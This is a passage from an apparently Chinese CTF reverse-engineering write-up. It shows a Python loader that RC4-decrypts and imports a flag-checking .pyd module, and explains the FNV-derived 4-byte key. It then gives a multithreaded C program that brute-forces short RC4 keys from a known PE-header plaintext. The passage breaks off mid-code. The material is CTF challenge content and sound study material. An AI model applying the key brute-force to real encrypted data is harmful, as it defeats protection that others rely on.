ctypes.c_void_p).value)</span><br><span class="line">data = <span class="string">b&#x27;\xb7\xc3\xbc\xe5 &lt;skip&gt;&#x27;</span></span><br><span class="line">data_buffer = ctypes.create_string_buffer(data)</span><br><span class="line">key_buffer = ctypes.create_string_buffer(key_bytes)</span><br><span class="line">data_buf = BUF(<span class="built_in">len</span>(data), <span class="number">0</span>, ctypes.addressof(data_buffer))</span><br><span class="line">key_buf = BUF(<span class="number">4</span>, <span class="number">0</span>, ctypes.addressof(key_buffer))</span><br><span class="line">fn(ctypes.byref(data_buf), ctypes.byref(key_buf))</span><br><span class="line">pyd_path = os.path.join(os.getcwd(), <span class="string">&#x27;checkinput.pyd&#x27;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(pyd_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(data_buffer.raw[:<span class="built_in">len</span>(data)])</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    spec = importlib.util.spec_from_file_location(<span class="string">&#x27;checkinput&#x27;</span>, pyd_path)</span><br><span class="line">    module = importlib.util.module_from_spec(spec)</span><br><span class="line">    spec.loader.exec_module(module)</span><br><span class="line">    flag = <span class="built_in">input</span>(<span class="string">&#x27;Input your flag: &#x27;</span>)</span><br><span class="line">    result = module.check(flag.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> result:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Right!&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Wrong!&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Wrong key!&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>关于key的运算，可以看到魔数2166136261与16777619，可以判断是FNV哈希算法，然后哈希值被打包成4字节的小端字节序格式（<code>key_bytes</code>），用作RC4解密的密钥。将解密后的数据放入当前目录下的<code>checkinput.pyd</code>文件中，使用<code>importlib</code>动态导入该模块，并获取其中的<code>check</code>函数。用户被提示输入flag，并调用<code>module.check</code>进行验证。</p>
<p>所以接下来需要求得RC4的密钥</p>
<p>已知:</p>
<ul>
<li>密文前四个字节：<code>\xb7\xc3\xbc\xe5</code>   明文前四个：<code>4D 5A 90 00</code></li>
<li>密钥长度为 4 字节</li>
</ul>
<p>rc4短密钥爆破脚本：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    MistHill, created on 10:24:34 2013-7-3</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    compile:</span></span><br><span class="line"><span class="comment">        Visual Studio 6:</span></span><br><span class="line"><span class="comment">            CL /Og /Os /Oy /Ob1 /GT /Gs /Gf /Gy /G6 /MT rc4KStream75MT.c /link /RELEASE</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Refs:</span></span><br><span class="line"><span class="comment">    1) Optimizing C++/Code optimization/Faster operations</span></span><br><span class="line"><span class="comment">        http://en.wikibooks.org/wiki/Optimizing_C%2B%2B/Code_optimization/Faster_operations</span></span><br><span class="line"><span class="comment">    2) Writing Efficient C and C Code Optimization</span></span><br><span class="line"><span class="comment">        http://www.codeproject.com/Articles/6154/Writing-Efficient-C-and-C-Code-Optimization</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    3) Multithreading Tutorial #1</span></span><br><span class="line"><span class="comment">        http://www.computersciencelab.com/MultithreadingTut1.htm</span></span><br><span class="line"><span class="comment">    4) Walkthrough: Debugging a Multithreaded Application</span></span><br><span class="line"><span class="comment">        http://msdn.microsoft.com/en-us/library/bb157784(v=vs.90).aspx</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TARGETKS1 0xe52c99fa</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">prepare_key</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *key_data_ptr, <span class="type">int</span> key_data_len, <span class="type">unsigned</span> <span class="type">char</span> *state)</span></span>;</span><br><span class="line"><span class="function">BOOL <span class="title">GetKeyStream</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *buffer_ptr, <span class="type">int</span> buffer_len, <span class="type">unsigned</span> <span class="type">char</span> *state)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> _Recursion(<span class="type">void</span>*);</span><br><span class="line"><span class="type">unsigned</span> __stdcall _RecursionT1(<span class="type">void</span>*);</span><br><span class="line"><span class="type">unsigned</span> __stdcall _RecursionT2(<span class="type">void</span>*);</span><br><span class="line"><span class="type">unsigned</span> __stdcall _RecursionT3(<span class="type">void</span>*);</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Recursion</span><span class="params">(<span class="type">int</span> idx, <span class="type">unsigned</span> <span class="type">char</span> *pKey, <span class="type">unsigned</span> <span class="type">char</span> *pKeyStream, <span class="type">unsigned</span> <span class="type">char</span> *pstate)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">ConsoleHandler</span><span class="params">(DWORD dwCtrlType)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ShowExecutionTime</span><span class="params">(BOOL bBreaked)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ShowMatchedKeystream</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>*)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//static int TargetKS1 = 0x62383550, TargetKS2 = 0x6F0C1E2C; /* Target KS = 50 35 38 62 2C 1E 0C 6F */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KeyLength 4</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> szErrMsgCT[] =<span class="string">&quot;Create thread%d failed!\n&quot;</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">char</span> szFmtHex2[] =<span class="string">&quot;%02X &quot;</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">char</span> szFmtDate[] =<span class="string">&quot;\n%s\t%04d-%02d-%02d %02d:%02d:%02d.%03d&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">char</span> stateinit[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">char</span> Key[<span class="number">8</span>], KeyT1[<span class="number">8</span>], KeyT2[<span class="number">8</span>], KeyT3[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Size: just 4 is fine. Exec. time of function GetKeyStream() reduced!</span></span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">char</span> KeyStream[<span class="number">4</span>], KeyStreamT1[<span class="number">4</span>], KeyStreamT2[<span class="number">4</span>], KeyStreamT3[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">char</span> state[<span class="number">256</span>], stateT1[<span class="number">256</span>], stateT2[<span class="number">256</span>], stateT3[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> SYSTEMTIME lt0, lt1;</span><br><span class="line"><span class="type">static</span> DWORD dw0, dw1;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    HANDLE hThread[<span class="number">3</span>];</span><br><span class="line">    <span class="type">unsigned</span> threadID[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">SetConsoleCtrlHandler</span>( (PHANDLER_ROUTINE)ConsoleHandler, TRUE)==FALSE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Unable to install handler!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">GetLocalTime</span>(&amp;lt0);</span><br><span class="line">    dw0 = <span class="built_in">GetTickCount</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i =<span class="number">0</span>; i &lt;<span class="number">256</span>; i++)</span><br><span class="line">        stateinit[i] = i;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Create the threads.</span></span><br><span class="line">    hThread[<span class="number">0</span>] = (HANDLE)_beginthreadex(<span class="literal">NULL</span>,<span class="number">0</span>, &amp;_RecursionT1,<span class="literal">NULL</span>,<span class="number">0</span>, &amp;threadID[<span class="number">0</span>] );</span><br><span class="line">    <span class="keyword">if</span>(!hThread[<span class="number">0</span>]) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(szErrMsgCT,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    hThread[<span class="number">1</span>] = (HANDLE)_beginthreadex(<span class="literal">NULL</span>,<span class="number">0</span>, &amp;_RecursionT2,<span class="literal">NULL</span>,<span class="number">0</span>, &amp;threadID[<span class="number">1</span>] );</span><br><span class="line">    <span class="keyword">if</span>(!hThread[<span class="number">1</span>]) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(szErrMsgCT,<span class="number">2</span>);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hThread[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    hThread[<span class="number">2</span>] = (HANDLE)_beginthreadex(<span class="literal">NULL</span>,<span class="number">0</span>, &amp;_RecursionT3,<span class="literal">NULL</span>,<span class="number">0</span>, &amp;threadID[<span class="number">2</span>] );</span><br><span class="line">    <span class="keyword">if</span>(!hThread[<span class="number">2</span>]) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(szErrMsgCT,<span class="number">3</span>);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hThread[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hThread[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    _Recursion(<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">WaitForMultipleObjects</span>(<span class="number">3</span>, hThread, TRUE, INFINITE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">CloseHandle</span>(hThread[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hThread[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hThread[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ShowExecutionTime</span>(FALSE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> _Recursion(<span class="type">void</span>* pArguments)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">register</span> <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 0x30~0x7A: T0(0x30~0x42), T1(0x43~0x55), T2(0x56~0x68), T3(0x69~0x7A)</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">64</span>;i++) &#123;</span><br><span class="line">        Key[<span class="number">0</span>] = i;</span><br><span class="line">        <span class="built_in">Recursion</span>(<span class="number">1</span>, Key, KeyStream, state);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> __stdcall _RecursionT1(<span class="type">void</span>* pArguments)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">register</span> <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">64</span>;i&lt;<span class="number">128</span>;i++) &#123;</span><br><span class="line">        KeyT1[<span class="number">0</span>] = i;</span><br><span class="line">        <span class="built_in">Recursion</span>(<span class="number">1</span>, KeyT1, KeyStreamT1, stateT1);</span><br><span class="line">    &#125;</span><br><span class="line">    _endthreadex(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> __stdcall _RecursionT2(<span class="type">void</span>* pArguments)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">register</span> <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">128</span>;i&lt;<span class="number">192</span>;i++) &#123;</span><br><span class="line">        KeyT2[<span class="number">0</span>] = i;</span><br><span class="line">        <span class="built_in">Recursion</span>(<span class="number">1</span>, KeyT2, KeyStreamT2, stateT2);</span><br><span class="line">    &#125;</span><br><span class="line">    _endthreadex(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> __stdcall _RecursionT3(<span class="type">void</span>* pArguments)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">register</span> <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">192</span>;i&lt;<span class="number">256</span>;i++) &#123;</span><br><span class="line">        KeyT3[<span class="number">0</span>] = i;</span><br><span class="line">        <span class="built_in">Recursion</span>(<span class="number">1</span>, KeyT3, KeyStreamT3, stateT3);</span><br><span class="line">    &#125;</span><br><span class="line">    _endthreadex(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Recursion</span><span class="params">(<span class="type">int</span> idx, <span class="type">unsigned</span> <span class="type">char</span> *pKey, <span class="type">unsigned</span> <span class="type">char</span> *pKeyStream, <span class="type">unsigned</span> <span class="type">char</span> *pstate)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">register</span> <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++) &#123;</span><br><span class="line">        pKey[idx] = i;</span><br><span class="line">        <span class="keyword">if</span>(idx <span class="number">+1</span> &lt; KeyLength)</span><br><span class="line">            <span class="built_in">Recursion</span>(idx <span class="number">+1</span>, pKey, pKeyStream, pstate);</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">memcpy</span>(pstate, stateinit,<span class="built_in">sizeof</span>(stateinit));</span><br><span class="line">            <span class="built_in">prepare_key</span>(pKey, KeyLength, pstate);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>( <span class="built_in">GetKeyStream</span>(pKeyStream,<span class="built_in">sizeof</span>(KeyStream), pstate) )</span><br><span class="line">                <span class="built_in">ShowMatchedKeystream</span>(pKey);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">prepare_key</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *key_data_ptr, <span class="type">int</span> key_data_len, <span class="type">unsigned</span> <span class="type">char</span> *state)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> swapByte;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> index1, index2;</span><br><span class="line">    <span class="type">int</span> counter;</span><br><span class="line"></span><br><span class="line">    index1 = index2 =<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(counter =<span class="number">0</span>; counter &lt;<span class="number">256</span>; counter++)</span><br><span class="line">    &#123;</span><br><span class="line">        index2 = key_data_ptr[index1] + state[counter] + index2;</span><br><span class="line"></span><br><span class="line">        swapByte = state[counter];</span><br><span class="line">        state[counter] = state[index2];</span><br><span class="line">        state[index2] = swapByte;</span><br><span class="line"></span><br><span class="line">        index1++;</span><br><span class="line">        <span class="keyword">while</span>(index1 == key_data_len)</span><br><span class="line">            index1 -= key_data_len;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">GetKeyStream</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *buffer_ptr, <span class="type">int</span> buffer_len, <span class="type">unsigned</span> <span class="type">char</span> *state)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> swapByte;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> x;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> y;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> xorIndex;</span><br><span class="line">    <span class="type">int</span> counter;</span><br><span class="line"></span><br><span class="line">    x = y =<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(counter =<span class="number">0</span>; counter &lt; buffer_len; counter ++)</span><br><span class="line">    &#123;</span><br><span class="line">        x++;</span><br><span class="line">        y = state[x] + y;</span><br><span class="line"></span><br><span class="line">        swapByte = state[x];</span><br><span class="line">        state[x] = state[y];</span><br><span class="line">        state[y] = swapByte;</span><br><span class="line"></span><br><span class="line">        xorIndex = state[x] + state[y];</span><br><span class="line"></span><br><span class="line">        buffer_ptr[counter] = state[xorIndex];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( *(<span class="type">int</span>*)buffer_ptr == TARGETKS1 )</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">ConsoleHandler</span><span class="params">(DWORD dwCtrlType)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(dwCtrlType == CTRL_C_EVENT) &#123;</span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\r&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;KeyLength;i++)</span><br><span class="line">            <span class="built_in">printf</span>(szFmtHex2, Key[i]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;, &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;KeyLength;i++)</span><br><span class="line">            <span class="built_in">printf</span>(szFmtHex2, KeyT1[i]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;, &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;KeyLength;i++)</span><br><span class="line">            <span class="built_in">printf</span>(szFmtHex2, KeyT2[i]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;, &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;KeyLength;i++)</span><br><span class="line">            <span class="built_in">printf</span>(szFmtHex2, KeyT3[i]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(dwCtrlType == CTRL_BREAK_EVENT)</span><br><span class="line">        <span class="built_in">ShowExecutionTime</span>(TRUE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ShowExecutionTime</span><span class="params">(BOOL bBreaked)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">GetLocalTime</span>(&amp;lt1);</span><br><span class="line">    dw1 = <span class="built_in">GetTickCount</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(bBreaked) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nCurrent Keys:\n\t&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;KeyLength;i++)</span><br><span class="line">            <span class="built_in">printf</span>(szFmtHex2, Key[i]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n\t&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;KeyLength;i++)</span><br><span class="line">            <span class="built_in">printf</span>(szFmtHex2, KeyT1[i]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n\t&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;KeyLength;i++)</span><br><span class="line">            <span class="built_in">printf</span>(szFmtHex2, KeyT2[i]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n\t&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;KeyLength;i++)</span><br><span class="line">            <span class="built_in">printf</span>(szFmtHex2, KeyT3[i]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(szFmtDate,<span class="string">&quot;Start:&quot;</span>, lt<span class="number">0.</span>wYear, lt<span class="number">0.</span>wMonth, lt<span class="number">0.</span>wDay, lt<span class="number">0.</span>wHour, lt<span class="number">0.</span>wMinute, lt<span class="number">0.</span>wSecond, lt<span class="number">0.</span>wMilliseconds);</span><br><span class="line">    <span class="built_in">printf</span>(szFmtDate,<span class="string">&quot;End:&quot;</span>, lt<span class="number">1.</span>wYear, lt<span class="number">1.</span>wMonth, lt<span class="number">1.</span>wDay, lt<span class="number">1.</span>wHour, lt<span class="number">1.</span>wMinute, lt<span class="number">1.</span>wSecond, lt<span class="number">1.</span>wMilliseconds);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n\nExecution time:\t%d.%d seconds.\n&quot;</span>, (dw1 - dw0)/<span class="number">1000</span>, (dw1 - dw0)%<span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ShowMatchedKeystream</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *pKey)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span 